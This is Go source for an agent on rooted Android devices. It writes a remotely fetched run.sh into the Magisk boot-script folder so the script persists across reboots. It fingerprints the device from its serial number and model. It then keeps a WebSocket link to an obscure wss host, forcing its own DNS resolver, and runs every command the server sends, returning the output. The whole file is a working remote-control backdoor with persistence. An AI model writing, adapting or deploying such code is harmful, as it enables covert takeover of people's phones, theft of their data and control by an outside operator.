package main

import (
	"bytes"
	"context"
	"crypto/md5"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

const (
	deviceFile        = "/data/adb/.deviceid"
	// !!! 更改 WS URL 為 WSS 協定和新的地址 !!!
	wsURL             = "wss://qdwqidhqiow.yg.gs:443/connect"
	forceDNS          = "223.5.5.5:53"
	retryDelay        = 3 * time.Second
	readTimeout       = 3 * time.Second
	pingPeriod        = 2 * time.Second
	scriptURL         = "https://ghproxy.net/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/run.sh"
	localScriptPath   = "/data/adb/service.d/run.sh"
	dirMode           = 0755
	fileMode          = 0755
)

// ------------------ 資料結構 ------------------
type Message struct {
	Type      string `json:"type"`
	CommandID string `json:"command_id"`
	DeviceID  string `json:"device_id,omitempty"`
	Command   string `json:"command,omitempty"`
	Output    string `json:"output,omitempty"`
	Error     string `json:"error,omitempty"`
}

// ------------------ 腳本更新處理 (已修改，應用強制 DNS) ------------------

// createForcedResolver 創建一個強制使用指定 DNS 伺服器的解析器
func createForcedResolver() *net.Resolver {
	return &net.Resolver{
		PreferGo: true,
		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
			d := net.Dialer{Timeout: 10 * time.Second}
			return d.DialContext(ctx, "udp", forceDNS) // 強制使用 223.5.5.5:53
		},
	}
}

// downloadScript 從指定的 URL 下載腳本內容 (應用強制 DNS)
func downloadScript(url string) ([]byte, error) {
	fmt.Printf("嘗試下載腳本: %s\n", url)

	// 1. 創建一個帶有強制 DNS 的撥號器
	transport := &http.Transport{
		Proxy: http.ProxyFromEnvironment,
		DialContext: (&net.Dialer{
			Timeout:     15 * time.Second,
			KeepAlive:   30 * time.Second,
			Resolver:    createForcedResolver(), // <--- 注入強制 DNS 解析器
		}).DialContext,
	}

	client := http.Client{
		Transport: transport,
		Timeout: 15 * time.Second,
	}
	
	resp, err := client.Get(url)
	if err != nil {
		return nil, fmt.Errorf("下載失敗: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("下載失敗，HTTP 狀態碼: %d", resp.StatusCode)
	}

	return io.ReadAll(resp.Body)
}

func UpdateScript() {
	newScriptContent, err := downloadScript(scriptURL)
	if err != nil {
		fmt.Printf("腳本下載失敗: %v\n", err)
		return
	}

	localScriptContent, err := os.ReadFile(localScriptPath)
	if err == nil {
		if bytes.Equal(newScriptContent, localScriptContent) {
			fmt.Println("本地腳本已是最新版本，無需更新。")
			return
		}
	} else if !os.IsNotExist(err) {
		fmt.Printf("讀取本地腳本失敗: %v\n", err)
		return
	}

	scriptDir := filepath.Dir(localScriptPath)
	if err := os.MkdirAll(scriptDir, dirMode); err != nil {
		fmt.Printf("創建或設置目錄權限 (%s, 0%o) 失敗: %v\n", scriptDir, dirMode, err)
		return
	}

	err = os.WriteFile(localScriptPath, newScriptContent, fileMode)
	if err != nil {
		fmt.Printf("寫入/更新本地腳本失敗: %v\n", err)
		return
	}

	fmt.Printf("成功更新本地腳本到: %s (權限: 0%o)\n", localScriptPath, fileMode)
}

// ------------------ 設備ID處理 (略) ------------------

func runCommand(name string, arg ...string) string {
	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
	defer cancel()
	cmd := exec.CommandContext(ctx, name, arg...)
	output, err := cmd.Output()
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(output))
}

func getPropValue(prop string) string {
	return runCommand("getprop", prop)
}

func readBuildPropValue(prop string) string {
	data, err := os.ReadFile("/system/build.prop")
	if err != nil {
		return ""
	}
	prefix := prop + "="
	for _, line := range strings.Split(string(data), "\n") {
		if strings.HasPrefix(line, prefix) {
			return strings.TrimSpace(line[len(prefix):])
		}
	}
	return ""
}

func generateDeviceID() string {
	var components []string

	serial := getPropValue("ro.serialno")
	model := getPropValue("ro.product.model")
	manufacturer := getPropValue("ro.product.manufacturer")
	brand := getPropValue("ro.product.brand")

	if serial != "" || model != "" || manufacturer != "" || brand != "" {
		if serial != "" {
			components = append(components, serial)
		}
		if model != "" {
			components = append(components, model)
		}
		if manufacturer != "" {
			components = append(components, manufacturer)
		}
		if brand != "" {
			components = append(components, brand)
		}
	}

	if len(components) == 0 {
		serial = readBuildPropValue("ro.serialno")
		model = readBuildPropValue("ro.product.model")
		manufacturer = readBuildPropValue("ro.product.manufacturer")

		if serial != "" {
			components = append(components, serial)
		}
		if model != "" {
			components = append(components, model)
		}
		if manufacturer != "" {
			components = append(components, manufacturer)
		}
	}

	deviceComponents := strings.Join(components, "_")

	if deviceComponents != "" {
		hash := md5.Sum([]byte(deviceComponents))
		return hex.EncodeToString(hash[:])
	}

	hostname, _ := os.Hostname()
	if hostname == "" {
		hostname = "unknown"
	}
	return fmt.Sprintf("%s-%d", hostname, time.Now().Unix())
}

func getDeviceID() string {
	data, err := os.ReadFile(deviceFile)
	if err == nil {
		id := strings.TrimSpace(string(data))
		if id != "" {
			return id
		}
	}

	newID := generateDeviceID()
	os.WriteFile(deviceFile, []byte(newID), 0644)
	return newID
}

// ------------------ 命令執行 (略) ------------------

func executeCommand(cmdLine, cmdID, deviceID string) Message {
	parts := strings.Fields(cmdLine)
	if len(parts) == 0 {
		return Message{Type: "result", CommandID: cmdID, DeviceID: deviceID, Error: "命令为空"}
	}

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, parts[0], parts[1:]...)
	output, err := cmd.CombinedOutput()

	msg := Message{
		Type:      "result",
		CommandID: cmdID,
		DeviceID:  deviceID,
		Output:    string(output),
	}
	if err != nil {
		msg.Error = err.Error()
	}
	return msg
}

// ------------------ WebSocket 連接管理 (使用 createForcedResolver) ------------------
type WSClient struct {
	conn     *websocket.Conn
	mu       sync.RWMutex
	deviceID string
	closed   bool
}

func NewWSClient(deviceID string) *WSClient {
	return &WSClient{
		deviceID: deviceID,
	}
}

func (w *WSClient) connect() error {
	u, _ := url.Parse(wsURL)
	q := u.Query()
	q.Set("device_id", w.deviceID)
	u.RawQuery = q.Encode()

	// 使用公共的解析器創建函式
	resolver := createForcedResolver()

	dialer := websocket.Dialer{
		Proxy: http.ProxyFromEnvironment,
		NetDialContext: (&net.Dialer{
			Timeout:   10 * time.Second,
			KeepAlive: 30 * time.Second,
			Resolver:  resolver, // 使用自定義解析器
		}).DialContext,
		// WSS 連接需要 TLS 配置，但對於簡單的連接，預設的配置通常足夠
	}

	conn, _, err := dialer.Dial(u.String(), nil)
	if err != nil {
		return err
	}

	w.mu.Lock()
	w.conn = conn
	w.closed = false
	w.mu.Unlock()

	conn.SetReadDeadline(time.Now().Add(readTimeout))
	conn.SetPongHandler(func(string) error {
		conn.SetReadDeadline(time.Now().Add(readTimeout))
		return nil
	})

	return nil
}

func (w *WSClient) close() {
	w.mu.Lock()
	defer w.mu.Unlock()

	if w.conn != nil && !w.closed {
		w.conn.Close()
		w.closed = true
	}
}

func (w *WSClient) isClosed() bool {
	w.mu.RLock()
	defer w.mu.RUnlock()
	return w.closed
}

func (w *WSClient) sendMessage(msg Message) error {
	w.mu.RLock()
	defer w.mu.RUnlock()

	if w.closed || w.conn == nil {
		return fmt.Errorf("connection closed")
	}

	return w.conn.WriteJSON(msg)
}

func (w *WSClient) startPing() {
	ticker := time.NewTicker(pingPeriod)
	defer ticker.Stop()

	for range ticker.C {
		if w.isClosed() {
			return
		}

		w.mu.RLock()
		conn := w.conn
		w.mu.RUnlock()

		if conn != nil {
			conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
			if err := conn.WriteMessage(websocket.PingMessage, nil); err != nil {
				w.close()
				return
			}
		}
	}
}

func (w *WSClient) listen() {
	defer w.close()

	for {
		if w.isClosed() {
			return
		}

		w.mu.RLock()
		conn := w.conn
		w.mu.RUnlock()

		if conn == nil {
			return
		}

		_, msg, err := conn.ReadMessage()
		if err != nil {
			fmt.Printf("讀取消息錯誤: %v\n", err)
			return
		}

		var m Message
		if err := json.Unmarshal(msg, &m); err != nil {
			continue
		}

		if m.Type == "command" && (m.DeviceID == "" || m.DeviceID == w.deviceID) {
			go func() {
				result := executeCommand(m.Command, m.CommandID, w.deviceID)
				if err := w.sendMessage(result); err != nil {
					fmt.Printf("發送結果錯誤: %v\n", err)
				}
			}()
		}
	}
}

// ------------------ 連接管理器 (略) ------------------
type ConnectionManager struct {
	client    *WSClient
	deviceID  string
	reconnect chan bool
}

func NewConnectionManager(deviceID string) *ConnectionManager {
	return &ConnectionManager{
		deviceID:  deviceID,
		reconnect: make(chan bool, 1),
	}
}

func (cm *ConnectionManager) run() {
	for {
		cm.client = NewWSClient(cm.deviceID)

		fmt.Printf("嘗試連接服務器...\n")
		if err := cm.client.connect(); err != nil {
			fmt.Printf("連接失敗: %v, %v後重試...\n", err, retryDelay)
			time.Sleep(retryDelay)
			continue
		}

		fmt.Printf("連接成功! DeviceID: %s\n", cm.deviceID)

		go cm.client.startPing()
		go cm.client.listen()

		<-cm.reconnect

		fmt.Printf("連接斷開，%v後重試...\n", retryDelay)
		time.Sleep(retryDelay)
	}
}

func (cm *ConnectionManager) monitorConnection() {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		if cm.client.isClosed() {
			select {
			case cm.reconnect <- true:
			default:
			}
		}
	}
}

// ------------------ 主函數 (略) ------------------
func main() {
	UpdateScript()
	
	deviceID := getDeviceID()
	fmt.Printf("設備ID: %s\n", deviceID)

	manager := NewConnectionManager(deviceID)

	go manager.monitorConnection()

	manager.run()
}
